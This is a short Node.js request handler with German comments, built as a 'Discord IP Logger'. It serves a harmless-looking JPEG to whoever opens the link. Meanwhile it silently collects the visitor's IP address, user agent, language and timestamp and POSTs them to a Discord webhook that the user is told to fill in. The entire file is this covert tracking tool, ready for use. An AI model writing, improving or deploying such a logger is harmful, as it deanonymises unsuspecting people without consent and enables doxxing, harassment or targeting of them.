const crypto = require('crypto');

module.exports = (req, res) => {
  // IP-Adresse des Benutzers erfassen
  const userIP = req.headers['x-forwarded-for'] || 
                 req.headers['x-real-ip'] || 
                 req.connection.remoteAddress || 
                 req.socket.remoteAddress ||
                 (req.connection.socket ? req.connection.socket.remoteAddress : null);
  
  // User-Agent und weitere Informationen erfassen
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const language = req.headers['accept-language'] || 'Unknown';
  const timestamp = new Date().toISOString();
  
  // Discord Webhook URL (ersetze dies mit deinem Webhook)
  const webhookURL = 'DEINE_DISCORD_WEBHOOK_URL';
  
  // Daten für das Discord-Embed vorbereiten
  const embedData = {
    embeds: [{
      title: '🔍 IP-Logger Aktivität',
      color: 16711680, // Rot
      fields: [
        {
          name: '📍 IP-Adresse',
          value: `\`${userIP}\``,
          inline: true
        },
        {
          name: '🌐 User-Agent',
          value: `\`\`\`${userAgent}\`\`\``,
          inline: false
        },
        {
          name: '🗣️ Sprache',
          value: language,
          inline: true
        },
        {
          name: '⏰ Zeitstempel',
          value: timestamp,
          inline: true
        }
      ],
      footer: {
        text: 'Discord IP Logger',
        icon_url: 'https://i.imgur.com/your-icon.png'
      }
    }]
  };
  
  // Daten an Discord senden
  fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(embedData)
  })
  .then(response => {
    if (!response.ok) {
      console.error('Fehler beim Senden an Discord:', response.statusText);
    }
  })
  .catch(error => {
    console.error('Netzwerkfehler:', error);
  });
  
  // Bild an den Benutzer zurückgeben
  res.setHeader('Content-Type', 'image/jpeg');
  res.sendFile('image.jpg', { root: 'public' });
};
